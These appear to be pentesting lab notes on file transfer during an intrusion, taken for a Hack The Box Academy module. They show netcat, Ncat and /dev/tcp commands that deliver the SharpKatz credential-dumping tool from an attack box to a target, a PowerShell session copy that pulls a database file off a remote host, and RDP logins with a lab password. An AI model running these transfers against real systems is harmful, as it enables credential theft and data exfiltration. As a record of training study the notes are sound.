# NETCAT (nc)

# From attacker --> victim

## transfer file from attack host to target
 
TARGET:

![Exported image](Exported%20image%2020240712140346-0.png)  

ATTACK BOX:

![Exported image](Exported%20image%2020240712140346-1.png)   
# From victim <-- host (useful for firewalls blocking incoming connections)
 
ATTACK BOX: sending file as input  
-q 0 denotes terminate connection when finished

![Exported image](Exported%20image%2020240712140346-2.png)  

TARGET:

![Exported image](Exported%20image%2020240712140346-3.png)  

# NCAT (Nmap's Ncat)

# From attacker --> victim

## transfer file from attack host to target
 
TARGET:

![Exported image](Exported%20image%2020240712140346-4.png)  

ATTACK BOX:

![Exported image](Exported%20image%2020240712140346-5.png)     

# From victim <-- host (useful for firewalls blocking incoming connections)
 
ATTACK BOX: sending file as input  
--send-only denote terminate connection when finished

![Exported image](Exported%20image%2020240712140346-6.png)  

TARGET:

![Exported image](Exported%20image%2020240712140346-7.png)

_If nc or Ncat is not available on the remote host /dev/tcp can be used._

## nc on attack box:

![Exported image](Exported%20image%2020240712140346-8.png)  

## Ncat on attack box:

![Exported image](Exported%20image%2020240712140346-9.png)

```
ncat -I -p 443 --send-only < SharpKatz.exe 

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe 


PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession 
$Session -Destination C:
\
Users
\
Administrator
\
Desktop\
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession 
$Session

rdesktop 
10.10
.10.132 -d HTB -u administrator -p 
'Password0@'
-r disk:linux
=
'/home/user/rdesktop/files'

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:
'Password0@'
/drive:linux,/home/plaintext/htb/academy/filetransfer



```
 
## remote host:

![Exported image](Exported%20image%2020240712140346-10.png)

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 
## Powershell Session File Transfer

- must be administrator
- PowerShell Remoting turned on
    
    - test with $Test-Connection -ComputerName <name> -Port 5985
- creates http/https listeners on 5985/5986
 
1. Create Remoting Session
    
    1. ![Exported image](Exported%20image%2020240712140346-11.png)
2. Copy-Item from local to session
    
    1. PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
3. Copy-Item from remote to local
    
    1. PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 
## RDP

- use to mount drives inside RDP session

### rdesktop

rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@'-r disk:linux='/home/user/rdesktop/files'
 
### xfreerdp

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@'/drive:linux,/home/plaintext/htb/academy/filetransfer
 
Inside, access [\\tsclient\](file:///\\tsclient\) to transfer files  
or  
mstsc.exe can be used